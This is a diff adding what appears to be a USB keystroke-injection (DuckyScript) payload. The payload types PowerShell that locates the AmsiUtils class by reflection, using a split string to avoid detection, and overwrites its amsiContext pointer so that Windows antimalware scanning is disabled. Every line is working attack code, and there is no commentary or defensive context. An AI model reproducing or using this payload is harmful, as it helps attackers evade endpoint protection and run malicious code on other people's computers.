@@ -1,0 +1,14 @@
+DEFAULTCHARDELAY 15
+
+STRING $a=[Ref].Assembly.GetTypes();
+STRING Foreach($b in $a) {if ($b.Name -like "*iU"+"tils") {$c=$b}}
+ENTER
+STRING $d=$c.GetFields('NonPublic,Static');
+STRING Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}}
+ENTER
+STRING $g=$f.GetValue($null);
+STRING [IntPtr]$ptr=$g
+ENTER
+STRING [Int32[]]$buf = @(0);
+STRING [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+ENTER
